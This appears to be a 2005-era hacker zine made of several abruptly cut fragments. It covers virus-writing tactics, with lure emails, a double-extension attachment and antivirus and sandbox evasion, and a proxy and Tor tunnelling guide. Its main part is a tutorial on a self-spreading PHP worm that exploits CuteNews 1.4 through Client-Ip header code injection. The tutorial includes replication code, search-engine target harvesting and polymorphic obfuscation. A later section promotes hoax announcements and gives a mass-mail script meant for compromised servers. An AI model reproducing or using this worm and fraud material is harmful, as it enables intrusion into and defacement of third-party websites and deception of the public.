Hi, open the attachment\r\n\r\nAttachment: blah.exe\r\n\r\n--------end of mail---------------------\r\n\r\nwouldn't attact many people. It is boring. A mail like this however:\r\n\r\n----------start of mail---------------------\r\n\r\nSubject: Your Credit Card has been charged\r\n\r\nBody: \r\nDear recipient@provider.com,\r\n\r\nYour purchase of the $1000 bodyset-deluxe was sucessfull, your credit-card has\r\nbeen charged accordingly, check\r\nthe attachment for details.\r\n\r\nYours sincerly,\r\n\r\nThe E-Bay team.\r\n\r\nAttachment: Details.doc.exe\r\n\r\n--------end of mail---------------------\r\n\r\nwould attract more people, they would be eager to see what has happened to them,\r\nnobody wants to be\r\ncharged for something they haven't bought.\r\n\r\nThis goes for the P2P way too, files like StarWars - Revengeofthesith.avi.exe\r\nspread faster than blah.exe.\r\nAlso, most people feel more secure if a file is zipped. Well, including a\r\nzip-component in your malware, to zip it everytime it replicates isn't that\r\ndifficult.\r\n\r\nII) Efficiency\r\n\r\nThere always needs to be a delicate balance between spreading,stealth and\r\nefficincy. Spreading like mad will get your malware very far, but it will be\r\ndetected in a matter of hours, making it obsolete, while extreme stealth might\r\nkeep your malware undetected for years, but it won't infect more than 10 boxes.\r\nBeing efficint totally depends on your goals.\r\n\r\nIII) Stealth\r\n\r\nMalware has many enemies, here are some of them:\r\n\r\na) AV's\r\nb) Firewalls\r\nc) AV researchers\r\n\r\nfooling AV's isn't too dificult, sometimes switching two or three bytes is\r\nenough to fool them, but your virus will get detected again and all will be for\r\nnope.\r\nSo you need to protect your malware from AV's. Thus\r\nencryption,Oligomorphism,Polymorphism and Metamorphism are born. For all\r\ncryptographers out there, let go of the classic idea of encryption, Viral\r\nencryption is something different. Encryption,Polymorphism,Oligomorphism and\r\nMetamorphism for executables is only possible in assembly, so start learning it!\r\n\r\nFooling firewalls can also be done quite easily, just terminate their processes!\r\nAlthough this is quite rude and unsubtle, it is effective. A more subtle way is\r\nadding your program to their trustedprogram-list.\r\n\r\nFooling an AV researcher can be quite difficult. They will disassemble your\r\nvirus, Emulate it's code and Sandbox it. Making your virus extremely complex,\r\nwith long loops and jumps will keep them from fully understanding it by\r\ndisassembly. Stopping Emulation is quite difficult, you would have to check if\r\nyour code is being emulated by making a change, and checking if that change\r\nreally has been applied, if not, you are being emulated. Sandboxing is a\r\ntehcnique that involves putting your virus in a virtual machine with some\r\nbaitfiles to see what it does. This could be overcome by checking for VMware,\r\nVirtual Pc, etc. I will give details later.\r\n\r\n2) Code Practice.\r\n\r\nBefore starting this section I assume the reader is familiar with standard\r\nprogramming theory,viral theory and several (script)languages, such as\r\nc++,Pascal,Vbs,Js, batch and some assembler would help too. All assembler source\r\nexamples will be in 16-bit assembler, since these are mainly for educational\r\npurposes, their outdated nature will nearly automatically SK-Proof it, however,\r\nanyone familiar with 16/32- bit assembler can convert the examples to suit the\r\nwin32 platform.\r\nThis section will contain viral code. I am not responsible for any damage done\r\nby any of these programs, nor do I promote releasing them. I have divided the\r\nCode Practice in several sections as follows:\r\n\r\nI) Simple Exe Virii\r\nII) Batch Virii\r\nIII)Script Virii\r\nIV) Moderate ExeVirii/Worms\r\nV) Concept Virii\r\n\r\n( Sample code can be found online at http://www.hackthissite.org/zine/ )\r\n\r\n[ ---------------------------------------------------------------------------- ]\r\n[ proxy chaining, tunnelling and tor................. by outthere and kuroishi ]\r\n[ ---------------------------------------------------------------------------- ]\r\n\r\nThe creation of anonymous networks like Tor based on assymetric key\r\ncryptography and onion routers do make traditional proxy services seem rather\r\nold fashioned, but traditional anonymous proxy services are still quite useful\r\nfor IRC, jump boxes, and general internet tomfoolery, despite the threats from\r\nhoneypots.\r\n\r\nA proxy is a piece of software that makes requests on behalf of a client to\r\nremote resources. This article goes into short, practical summaries of several\r\nprevelent proxy protocols available accross the internet. Authorization and\r\nidentification procedures are mostly ignored, since open proxies are so common\r\nand to keep the article short and practical.\r\n\r\n=== CGI Proxies ===\r\nCGI proxies simply fetch web pages and occasionally FTP or other data based on\r\nuser-supplied input, which is usually just a GET variable. For example,\r\n  http://foo.bar/p.php?url=http://www.hackthissite.org/\r\nThe reliability and transfer rates of these services are often quite high, and\r\ncan be easily strung together directly from the URL in many cases, like so:\r\n  http://foo.bar/p.php?url=http://bar.foo/url.cgi?u=http://www.hackthissite.org/\r\nMany language translators also function in this capacity, but unfortunately they\r\noften send an X-Forwarded-For header identifying the sender's IP address.\r\n\r\n=== HTTP Proxies ===\r\nHTTP Proxies are pretty simple. The client sends a regular HTTP request to the\r\nproxy server with an absolute URI. Therefore, what would normally be:\r\n  GET / HTTP/1.1\r\n  Host: www.hackthissite.org\r\n    \r\nwhen connecting directly to the hackthissite.org server becomes:\r\n  GET http://www.hackthissite.org/\r\n  Host: www.hackthissite.org\r\n    \r\nwhen connecting through a proxy. A blank line after the last header establishes\r\nthe end of the request (unless a Content-Length has been specified, as is\r\ntypical for a POST). The request then goes right on through as if the\r\ndestination had been directly connected to. Easy.\r\n\r\nUnfortunately, some http proxies are configured to send certain personally\r\nidentifying information to the remote systems.\r\n  * Transparent proxies send the client IP address in the X-Forwarded-For\r\n    header and other headers affirming the use of a proxy server.\r\n  * Anonymous proxies send out headers stating that the server is a proxy, but\r\n    don't send out the client's IP address.\r\n  * High anomnity, or \"elite\" proxies don't send out any information that\r\n    identifies the service as a proxy to the destination.\r\n\r\n=== HTTP CONNECT ===\r\nConnect proxies were created as an extension to HTTP proxies as a means for\r\nestablishing persistent connections for protocols such as IRC. They are\r\nrelatively simple as well. For instance:\r\n  CONNECT irc.hackthissite.org:6667 HTTP/1.1\r\n    \r\nwill establish a connection to the HTS IRC server on port 6667. The server will\r\nreply with an HTTP-formatted status message, and if the request was successful,\r\ndata can be sent and received freely. Because connect is an extention to the\r\nHTTP protocol, adding extra lines like a Host or a User-Agent will work just\r\nfine, but for most purposes is unnecessary.\r\n\r\n=== SOCKS4 ===\r\nSocks4a is an extension to the original socks4 to provide DNS lookup at the\r\nproxy side. First, the client sends a request like so:\r\n  * \\x04 - socks4 version identifier\r\n  * \\x01 - command; 1 is connect\r\n  * \\x00\\x50 - port expressed as 16 bit big endian: \\x00\\x50 would be port 80\r\n      In Perl, pack(\"n\", $port) will convert the integer $port to 16 bit big\r\n      endian.\r\n  * \\xc0\\xa8\\x06\\x47 - 4 bytes specifying the destination IPv4 address: the 4\r\n      bytes shown would equate to 192.168.6.71. Use \\x00\\x00\\x00\\x01 if the\r\n      proxy is to do the DNS lookup itself. (Any non-zero for the last octet\r\n      will do.)\r\n  * rawr\\x00 - null-terminated USERID string, these are occasionally compared to\r\n      IP addresses or IDENT replies as a primative form of authentication, but\r\n      rarely. Most of the time this string is ignored, so put something random.\r\n  * hackthissite.org\\x00 - null-terminated domain name, just a null byte if a\r\n      valid IP was provided earlier\r\nThe socks4 server then sends a reply like so:\r\n  * \\x00 - version of the reply code, should always be 0\r\n  * \\x5A - request granted\r\n    OR \\x5B - rejected or failed\r\n    OR \\x5C - rejected because can't connect to identd on the client\r\n    OR \\x5D - rejected because identd and the client report different IDs\r\n  * \\x00\\x50 - destination port, ignore\r\n  * \\xc0\\xa8\\x06\\x47 - destination IP, ignore\r\nAfter these steps write directly to the socket as if the client was directly\r\nconnected.\r\n\r\n=== SOCKS5 ===\r\nSocks5 was developed to provide both UDP and TCP, strong authentication, DNS,\r\nand IPv6 from the ground up. First off, the client sends a version\r\nidentifier/method selection message:\r\n  * \\x05 - socks5 version identifier\r\n  * \\x01 - number of methods to try; for our purposes, one will suffice\r\n  * \\x00 - methods; \\x00 is no authentication required\r\nThe server will then reply:\r\n  * \\x05 - socks5 version identifier\r\n  * \\x00 - selected method; if this is \\xff then the client must disconnect\r\nIf everything went well, the client then sends a socks5 request:\r\n  * \\x05 - socks5 version identifier\r\n  * \\x01 - command (\\x01 for connect)\r\n  * \\x00 - reserved, leave null for now\r\n  * \\x01 - address type, \\x01 for IPv4\r\n    OR \\x03 - for a domain name\r\n    OR \\x04 - for IPv6\r\n  * \\xc0\\xa8\\x06\\x47 - 4 octets specifying the address for IPv4\r\n    OR 16 octets for an IPv6 address\r\n    OR 1 byte specifying the string length then the domain name for DNS\r\n  * \\x00\\x50 - destination port, \\x00\\x50 is port 80\r\nThe server replies with:\r\n  * \\x05 - socks5 version\r\n  * \\x00 - reply field, \\x00 for successful\r\n    OR \\x01 for general socks server failure\r\n    OR \\x02 for connection not allowed\r\n    OR \\x03 for network unreachable\r\n    OR \\x04 for host unreachable\r\n    OR \\x05 for connection refused\r\n    OR \\x06 for time to live expired\r\n    OR \\x07 for command not supported\r\n    OR \\x08 for address type not supported\r\n    OR \\x09 to \\xff for unassigned\r\n  * \\x00 - reserved, always \\x00\r\n  * \\x01 - address type, same values as in request\r\n  * \\xc0\\xa8\\x06\\x47 - bound address\r\n  * \\x00\\x50 - bound port, doesn't really matter for a connect request\r\nThen the transaction continues as if the client were directly connected.  \r\n\r\n=== Chains, Final Notes ===\r\nFor added anomnity, multiple proxies can be strung together in a process known\r\nas chaining. In proxy chains, the client instructs proxy servers to connect to\r\nsubsequent proxy servers until the destination. This technique can greatly\r\nimprove anomnity, but may decrease throughput and increase latency.\r\n\r\nInterestingly, Tor is nothing more than a socks4a proxy service as far as the\r\nclient is concerned, which brings in the possibility of using Tor conceptually\r\nas just another link in a chain. Extending Tor exit nodes with open proxies\r\nalso opens up the possibility of getting around Tor restrictions on some\r\nnetworks while maintaining encryption and anomnity, as it is much easier to\r\nblock Tor than to block the massive number of open proxies on the internet,\r\nespecially those on non-standard ports.\r\n\r\nReader, beware. Many proxies are run by phishers, over-zealous network\r\nadministrators, or law enforcement agencies that log everything. Always use more\r\nthan one layer of anomnity and never send unencrypted personally identifyable\r\ninformation through public proxy servers.\r\n\r\nhttp://proxy-glue.sourceforge.net/\r\n\r\n[------------------------------------------------------------------------------]\r\n[ tunnelling and tor ................................................ kuroishi ]\r\n[------------------------------------------------------------------------------]\r\n\r\nTor is the Onion Routing Protocol, a project being developed by the Electronic\r\nFreedom Frontier (EFF) for anonymity and privacy protection on the internet.  It\r\nbreaks up your packets and spreads them over the entire Tor network, encrypted,\r\nto end points around the world, where they are reassembled and sent to their\r\nintended destination.  Tor can be used to protect your identity when browsing\r\nthe web, chatting, or when doing super fun no-no stuffs ;D.\r\n\r\nFirst, install Tor.  Tor is available from the EFF, at tor.eff.org.  Set it up\r\non your OS of choice.  You'll also probably want Privoxy, instructions on\r\nconfiguring your HTTP Proxy (privoxy) to use a SOCKS proxy (tor), see the Tor\r\nwebsite.\r\n\r\nTo use Tor to anonymize your web browsing, open your browsers proxy settings.\r\nIf you're using both Tor and Privoxy you'll want to point your http proxy to\r\nlocalhost, port 8118. If you're using Firefox, you'll want to check the box that\r\nsays \"Use the same proxy for all protocols.\"  If you're not using Privoxy (just\r\nTor), set your SOCKS v4 proxy to localhost, port 9050.  Check if it's working by\r\ngoing to http://whatismyip.com.  (a note for Firefox users: there is a handy\r\nFirefox extension called ProxyButton.  It allows you to toggle your proxy on and\r\noff quickly from your toolbar.  I recommend this extension if your doing serious\r\nwebhacking ;D)\r\n\r\nYou can set up other applications to route traffic through tor. Direct SOCKS\r\nproxies through localhost port 9050.  But sometimes you may want to use Tor for\r\nan application that does not have SOCKS support, that's where socat comes in\r\nhandy.  Socat is a useful tool for dealing with socket connections and tunnels.\r\nI've written a quick script, called torbind to handle socat for us.\r\n\r\n#!/bin/bash\r\n# Usage: ./torbind [local port] [remote host] [remote port]\r\nsocat TCP4-LISTEN:$1,fork SOCKS4A:localhost:$2:$3,socksport=9050\r\n\r\nSay we want to telnet to a remote host over tor.  Using socat we could do this:\r\n\t\r\n$ ./torbind 1337 h4x3db0x0r.com 12345&; telnet localhost 1337\r\nConnected to h4x3db0x0r.com port 12345.\r\nPassword?:\r\n\t\r\nor IRC:\r\n\t\r\n$ ./torbind 7000 irc.hackthissite.org 7000&; irssi\r\n/server -ssl localhost 7000\r\n\t\r\nYou can route any port on local host to any port on any destination through tor.\r\nYou can figure out how to use this on your own ;D.\r\n\r\nSay your hacking on the road.  You need to use a library or university computer\r\nto do some serious buisness.  You can't install Tor due to certain restrictions,\r\nor just due to time.  A nice quick n' dirty way of getting anonymous protection\r\nis to use an SSH tunnel.  Any SSH client can route traffic through a SOCKS\r\ntunnel to your ssh server.  If you have Tor and Privoxy running on your server\r\nyou can route your traffic out through that.  In Linux or MacOS just do for\r\nexample:\r\n\r\nuser@localhost $ ssh -L12345:localhost:8118 user@remotehost.com\r\nPassword:\r\nuser@remotehost.com $\r\n\r\nBack at localhost you can now set your http proxies to localhost:12345.  This\r\nwill bounce traffic through your ssh session to your server, and out through Tor\r\nfor complete quick anonymity.\r\n\r\nIn windows, you can set up an SSH tunnel using PuTTY.\r\n\r\nIn PuTTY Config, under SSH, go to Tunnels and Add a new forwarded port, set\r\nsource port, like above something arbitrary, say 12345.  Destination should be\r\nlocalhost:8118 (for Privoxy, without privoxy, use port 9050, for SOCKS.)  Now\r\nconnect to your SSH server, authenticate, and you should be able to set your\r\nHTTP or SOCKS proxy to localhost, port 12345.\r\n\r\nYou also configure the unix command line ssh client to bounce through tor.\r\nInstall connect.c at /usr/local/bin/connect and add the following to your\r\nssh_config file. Alternatively, you can write shell scripts to automate the\r\nprocess of alternating between tor ssh and non tor ssh.\r\n\r\nHost *\r\nProxyCommand /usr/local/bin/connect -4 -S 127.0.0.1:9050 %h %p\r\n(needs to have /usr/local/bin/connect )\r\n\r\nsshtor.sh:\r\n#!/bin/bash\r\ncp /sw/etc/ssh/ssh_config.tor /sw/etc/ssh/ssh_config\r\n\r\nsshnontor.sh:\r\n#!/bin/bash\r\ncp /sw/etc/ssh/ssh_config.nontor /sw/etc/ssh/ssh_config\r\n\r\n                                !!!!!!!!!!!!!!!!\r\n                                !!!

The worm is called World Cant Wait\r\nand would post an announcement of the November 2nd Drive Out the Bush Regime\r\nprotests on thousands of message boards and blog engines. The original made use\r\nof a private vulnerability but the techniques described here use the recently\r\ndisclosed php code execution vulnerability in CuteNews 1.4. We were playing\r\naround with automating this exploit to find targets and replicate itself as a\r\nprogramming exercise while we were toying with the idea of covertly releasing it\r\nin the buildup to the protests to get people to the streets and give teeth to\r\nthe movement. In the end we decided that instead of risking legal complications\r\nand trashing a bunch of systems, we would strengthen our movement by explaining\r\nthe techniques and release the code in modules to help arm future php worm\r\nrevolutionaries.\r\n\r\nAlthough we left some intentional bugs and took portions of the code out, the\r\nsnippets below can be used to build a destructive worm. Recognize the\r\nimplications of getting involved with such actions and don't make ourselves into\r\nthe violent and destructive hackers the media tries to paint us as. The beauty\r\nand genius of a worm is in writing the code itself, not how many systems it can\r\nmess with. So let's get to it, and remember - coding is not a crime.\r\n\r\n**** Automation ****\r\nFind a vulnerability and write a self-automated target gathering and\r\nexploitation engine. Web based vulnerabilities are predictable, can gather\r\ntargets through search engines fairly easily, and can be exploited automatically\r\nby forging a series of HTTP requests.\r\n\r\nwhile ($stop == false) {\r\n  $list = gather_targets();\r\n  for ($i=0;$i<count($list);$i++) {\r\n    echo \" [x] targetting $list[$i]...\\n\";\r\n    if (!is_infected($list[$i])) infect($list[$i]);\r\n  }\r\n  $stop = true;\r\n}\r\n\r\nIn order to have a web based worm spread, you need to automate the exploitation\r\nprocess. This can be done by using PHP's socket functions to establish\r\nconnections to the web server and sending http data. This function demonstrates\r\nhow a PHP script can connect to a server, send data, and return the response:\r\n\r\nfunction make_request($domain, $packet) {\r\n  $fp = @fsockopen($domain, 80, $errno, $errstr, 10);\r\n  if (!$fp) return false;\r\n  fwrite($fp, $packet);\r\n  while (!feof($fp)) $text.= fgets($fp);\r\n  fclose($fp);\r\n}\r\n\r\nThen it is just a matter of forging a proper HTTP request which will exploit the\r\nvulnerability and get it to run a copy of itself on the infected system.\r\nCuteNews writes information to data/flood.db.php when someone posts comments to\r\na news article. You can insert PHP code to this file by passing data in the\r\nClient-Ip HTTP header.\r\n\r\n$packet = str_replace(\"\\n\",\"\\n\\r\", \r\n\"POST\r\n$location/example2.php?subaction=showcomments&id=1128188313&archive=&start_from=\r\n&ucat=& HTTP/1.1\r\nAccept: */*\\r\\nAccept-Language: en\r\nAccept-Encoding: gzip, deflate\r\nClient-Ip: <?php echo \\\"arbitrary php code to be executed!!\\\"; ?>\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/412.6\r\n(KHTML, like Gecko) Safari/412.2\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 107\r\nConnection: close\r\nHost: $domain\r\n\r\nname=haxitup&mail=&comments=j00+haxed+%3Alaughing%3A&submit=Add+My+Comment&\r\nsubaction=addcomment&ucat=&show=\r\n\r\n\";\r\n\r\nIf we make a couple of these requests, it will write the PHP code from Client-IP\r\nto flood.db.php. Then we can call flood.php from a standard GET request to\r\nexecute the code. Now that we can automate the process of executing PHP code on\r\na given server, we can start thinking about some code that will replicate the\r\nworm as well as delivering our payload. This example will copy the entire worm\r\ncode to 'sekret.php' on the vulnerable server, ready to be run. You can add any\r\npayload at the end of Client-Ip, from running sekret.php to adding a line at the\r\ntop of news.txt which will make a news post on every vulnerable CuteNews site ;)\r\n;)\r\n\r\n$source = str_replace(\"\\$\", \"\\\\\\$\",str_replace(\"\\\"\", \"\\\\\\\"\",str_replace(\"\\\\\",\r\n\"\\\\\\\\\",file_get_contents($_SERVER['PHP_SELF']))));\r\n...\r\nClient-Ip: <?php \\$fp=fopen(\\\"sekret.php\\\", \\\"w\\\");fwrite(\\$fp,\r\n\\\"$source\\\");fclose(\\$fp); ?>\\r\\n ...\r\n...\r\nfor ($i=0;$i<2;$i++) { $bob = make_request($domain, $packet); }\r\nmake_request($domain, \"GET $location/data/flood.db.php HTTP/1.1\\r\\nHost:\r\n$domain\\r\\nConnection: close\\r\\n\\r\\n\");\r\n\r\nOther Infection Method: PHP Inclusion\r\nIt is not difficult to automate the process of PHP include related\r\nvulnerabilities either. Poorly written PHP scripts commonly have bits of code\r\nsimilar to <?php include $page; ?>, which is vulnerable in many situations to\r\nremote PHP code execution by passing the URL to a bit of PHP code as the GET\r\nvariable 'page'. Our worm can copy itself to some place on the web root and pass\r\nthe URL to an HTTP GET request to execute itself on another server.\r\n\r\n$fp = fopen(\"sekret.txt\", \"w\");\r\nfwrite($fp, file_get_contents($_SERVER['PHP_SELF']));\r\nfclose($fp);\r\n$url = $_SERVER['SCRIPT_URI'];\r\nmake_request($domain, \"GET /test.php?path=$url HTTP/1.1\\r\\nHost:\r\n$domain\\r\\nConnection: close\\r\\n\\r\\n\");\r\n\r\nOther Infection Method: SQL\r\nOther Infection Method: JavaScript / XSS\r\n\r\n**** 3. Target Gathering ****\r\n\r\nDuring the development of the worm, it would be wise to seperate the actual\r\nexploit code from the target gathering code. Test on your own machine or on a\r\nLAN using code similar to:\r\n\r\nfunction gather_targets() {\r\n  return array(\"http://localhost/cutenews\");\r\n}\r\n\r\nFor the purposes of web based worms, it makes sense to use search engines in\r\norder to extract potential targets. You can easily write a few queries that will\r\nproduce URLs to sites running specific software. This can be automated through\r\npage scraping code to generate an array of targets which can be passed to your\r\nworm for infection.\r\n\r\n  $search = array(\"inurl:flood.db.php\", \"\\\"powered by cutenews v1.3\\\"\",\r\n\"\\\"/cutenews/remote_headlines.php\\\"\", \"\\\"powered by CuteNews\\\" \\\"2003..2005\r\nCutePHP\\\"\",  \"inurl:\\\"/newsarchive.php?archive\\\"\");\r\n  $query = $search[rand(0, count($search)-1)];\r\n  \r\nYou can scrape results from major search engines by making HTTP requests and\r\nlooking at the returned URLs.\r\n\r\n  $fp = fsockopen(\"google.com\", \"80\");\r\n  fwrite($fp, \"GET /search?q=\" . urlencode($query) .\r\n\"&sourceid=mozilla-search&start=0&start=0&ie=utf-8&oe=utf-8&client=firefox-a&rls\r\n=org.mozilla:en-US:official HTTP/1.1\\r\\n\r\nHost: www.google.com\\r\\n\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8)\r\nGecko/20050511/1.0.4\\r\\n\r\nAccept:\r\ntext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,\r\nimage/png,*/*;q=0.5\\r\\n\r\nAccept-Language: en-us,en;q=0.5\\r\\n\r\nAccept-Encoding: gzip,deflate\\r\\n\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n\r\nConnection: close\\r\\n\\r\\n\");\r\n  while (!feof($fp) AND (strpos($text, \"2005 Google\") === false)) {\r\n    $text.= fgets($fp);\r\n  }\r\n  fclose($fp);\r\n  \r\n  while (!(strpos($text, \"<a href=\\\"http://\") === false)) {\r\n    $starttext = substr($text, strpos($text, \"<a href=\\\"http://\") + 9);\r\n    $thenumber = substr($starttext, 0, strpos($starttext, \"\\\"\"));\r\n    $text = str_replace(\"<a href=\\\"$thenumber\\\">\", \"x\", $text);   \r\n    if (strpos($thenumber, \"google\") === false) $vuln[] = $thenumber;\r\n  }  \r\n  print_r($vuln);\r\n\r\n**** Evading IDS, Polymorphism, and Communication ****\r\nYou can adjust the source of the program on the fly by making several find and\r\nreplaces in the code for each new iteration of the worm. PHP and other languages\r\nhave several function aliases that can be swapped to produce the same results.\r\nConsider adding extroneous PHP code as trash to confuse file sizes and coding\r\nsimilarities. In addition to changing the names of variables in the program, you\r\ncan also express values of numbers and strings in different ways. \r\n\r\n$random++;              ->        $random+= -2 + 3;\r\n$start = \"go\";          ->        $start = chr(103) . chr(111);\r\n$num = count($result);  ->        $num = sizeof($result);\r\n\r\nThe following bit of code published in 29a rewrites the source using new\r\nvariable names.\r\n\r\n<?php\r\n$changevars=array('changevars', 'content', 'newvars', 'counti','countj',\r\n'trash');\r\nsrand((double)microtime()*1000000);\r\n$content=fread(fopen(__FILE__,'r'),filesize(__FILE__));\r\n$counti=0;\r\nwhile($changevars[$counti]) {\r\n  $content=str_replace($changevars[++$counti], trash('',0), $content);\r\n}\r\nfwrite(fopen(__FILE__,'w'),$content);\r\n\r\nfunction trash($newvar, $countj) {\r\n  do { $newvar.=chr(rand(97,122)); } while (++$countj<rand(5,15));\r\n  return $newvar;\r\n}\r\n?>\r\n\r\nRandomizing data sent in the http request, making it less predictable. You can\r\ninclude and choose a random user-agent making it look like real users. Or you\r\ncan adjust the actual POST data so that they aren't all using the same values\r\nfor each form name (like the above cutenews example). \r\n\r\nIf your worm depends on a search engine like google to gather targets, it might\r\nbe worth considering diversifying your queries as to reduce the chances of being\r\nblacklisted and killing the worm. inurl might find a lot of pages, but intitle\r\nworks as well. Consider randomizing the user-agent of your http requests or\r\nintegrating multiple search engine support to keep them confused and extend the\r\nduration of the worm.\r\n\r\nDevelop methods of communicating with past and future iterations of the worm,\r\nfeeding it locations of attacked boxes. A decentralized method of interworm\r\ncommunication can also help the worm adapt itself by discovering(fuzzing) new\r\nexploits or being fed new attack vectors. \r\n\r\n**** Final Words ****\r\nWorld Cant Wait was developed as a simple proof-of-concept in the world of\r\nwriting web based worms that spread through vulnerable php scripts. Although the\r\nworm code was not designed to trash systems (the above code won't even work\r\nwithout some modification) the concepts can be used to deliver all sorts of\r\npayloads. Script kiddie worms have in the past been used to gather jumpboxes,\r\nharvest passwords, or ddos major systems, while others have actually went and\r\npatched the security hole of the vulnerable software. Others are toying with the\r\nidea of making mass amounts of posts on guestbooks, blogs, and message boards to\r\ngoogle bomb and manipulate google and other spidering systems. The possibilities\r\nare endless, and the real genius is in creativity. \r\n\r\nMost people interested in advanced coding exercises such as writing worms are\r\nmotivated by the challenge of actually developing efficient code to automate the\r\nart of gathering targets and exploiting them. There is no greater and more\r\nbeautiful coding exercise for efficiency and complexity than coding a worm. Even\r\nif writing code can be considered a criminal act in the eyes of the state,\r\ninterest in this beautiful art has been around for decades and will always\r\nremain a part of hacker culture as long as we are able to develop them in a\r\nsecure and responsible way. \r\n\r\n[------------------------------------------------------------------------------]\r\n[ creating national media stunts ............................................. ]\r\n[------------------------------------------------------------------------------]\r\n\r\ncoordinate with other national actions, events, protests. find something that\r\nwill already be on people's mind and add fuel to the flames. \r\n\r\ncause electronic disruption: announce a phony mayor resignation, pose as your\r\nboss announcing raises for everybody, give people discounts for phone gas\r\ninternet or public transit services.\r\n\r\nmake mass announcements to mainstream and independent media to publicize your\r\nactions. write a well formatted press announcement look up and contact reporters\r\nor other members of the press. mass communication(gather media lists and send\r\nmass emails, post to indymedia, upload files to p2p networks, file drops, or\r\nother popular archive sites. \r\n\r\ncover your tracks, never use the same name twice, don't compromise with white\r\nhats or sellouts, embrace a diversity of tactics, have fun and don't get caught!\r\n  \r\n\r\nMass Mail Script: drop on a box and create a newline-seperated text file full of\r\nemails to major newspapers, televiion and radio stations, congress, etc. \r\n\r\n<?php\r\n$fromemail = \"Name Here <never@guess>\";\r\n$subject = \"insert subject here!\";\r\n$message = \"insert\\nmessage\\nhere!\";\r\n$handle = fopen(\"emails.txt\", \"r\");\r\nwhile (!feof($handle)) {\r\n  $buffer = fgets($handle, 4096);\r\n  if ($buffer != \"\" AND $buffer != \"\\n\") {\r\n    echo \"Send to $buffer...\\n\";\r\n    $a = mail ($buffer, $subject, $message, \"From: $fromemail\");\r\n    if ($a == false) echo \"<font color=\\\"red\\\">Bad!</font> \\n\";\r\n    echo \"Done.<br>\";\r\n  }\r\n}\r\nfclose($handle); ?><br><br>done altogether!\r\n\r\n  \r\n\"France's Youth Battles Also Waged on the Web\"\r\nWashington Post, November 10, 2005\r\n\r\nWhile riot police are attempting to curb the gangs that have been setting fire\r\nto cars and buildings in France's poor suburban communities for the past two\r\nweeks, French officials have only just begun the struggle to control a more\r\namorphous battleground: cyberspace.\r\n\r\nInternet blogs have become so vicious and intense that police have opened\r\ninvestigations against two teenagers for inciting violence on radio\r\nstation-sponsored blogs.

By aiding the forces that work to\r\ndestroy the hacking movement, Chicago \"2600\" has lost all credibility as a\r\npublic hacking group. \r\n\r\nOver a period of months, several self-appointed Chicago 2600 administrators have\r\nacted in ways which endanger other hackers, abuse their power, and otherwise\r\nundermine the spirit of hacking in general.\r\n\r\n* Turned over logs and other information to narc to people's bosses with the\r\nsuccessful intent to get people fired.\r\n* Has worked with law enforcement to provide testimony and freelance\r\nsurveillance to aid the FBI's chances of conviction as well as work with\r\nright-wing group ProtestWarrior to do counter-intelligence and public smear\r\ncampaigns \r\n* Repeatedly censor and prevent people from posting to the public email list\r\nwhen they don't agree with the posts or want to hide some of the stuff they're\r\ndoing.\r\n* Run a secret email list for those who \"make the real decisions about the\r\ngroup\", which they have used to badmouth and conspire against other members\r\n* Moved meetings to a private location where they have banned several people\r\nwith threats of going to the police\r\n\r\nWhen approached about these violations, the administrators maintain that \"this\r\nis not a democracy\" and that they can run their \"private company\" any way they\r\nchoose. In addition to breaking a number of 2600 conventions, this sort of\r\negotistical, authoritative philosophy undermines the open democratic spirit of\r\nhacking.\r\n\r\nLike many other hacking groups, 2600 has counter-culture roots and has always\r\nembraced dissenting opinions. 2600 has also recognized that hacking is\r\ninherantly political, and how free technology can be used to defend digital\r\nrights and free speech. The Fifth HOPE was held in NYC a month before the\r\nRepublican National Convention came to town and had a number of political\r\npresentations covering independent media, the free software movement, and even a\r\nspeech talking about civil disobedience at the upcoming RNC protests.\r\n\r\n2600 has created a set of national guidelines in order to keep local groups\r\norganized around the principles of freedom and democracy and to prevent\r\npower-hungry administrators to abuse the rest of the group. \r\n\r\n\"Remember that meetings are open to all as per the meeting guidelines. Your\r\nmeeting CANNOT be \"sponsored\" by anyone or it's not a 2600 meeting. Also, avoid\r\nappearing to be a tight knit group as this will only discourage or intimidate\r\nnew attendees. It also would be inaccurate - meetings are no more yours than\r\nthey are anybody else's. Similarly, your site should only focus on the meeting\r\nitself, not activities outside of or after the meeting.
